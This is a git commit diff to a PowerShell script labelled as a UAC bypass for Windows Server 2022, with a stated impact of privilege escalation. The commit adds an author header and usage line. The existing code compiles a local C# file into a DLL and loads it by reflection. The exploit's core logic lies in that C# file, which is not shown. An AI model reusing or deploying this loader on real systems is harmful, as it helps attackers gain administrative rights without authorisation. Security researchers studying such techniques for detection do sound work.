ef980bc19bc0135743cc889bb975e1f97d8e60fb
Patrick x0xr00t Hoogeveen <25748471+x0xr00t@users.noreply.github.com>
2021-10-06 16:30:18 +0200

    Update win10-UACBypass.ps1

--- win10-UACBypass.ps1
+++ win10-UACBypass.ps1
@@ -1,3 +1,14 @@
+#!-.ps1 
+#
+# Author : P.Hoogeveem
+# Aka    : x0xr00t
+# Build  : 20210809
+# Name   : UAC Bypass Win Server 2022
+# Impact : Privesc 
+# Method : DllReflection
+# 
+# Usage  : run the .ps1 file. 
+
 Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
 
 [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
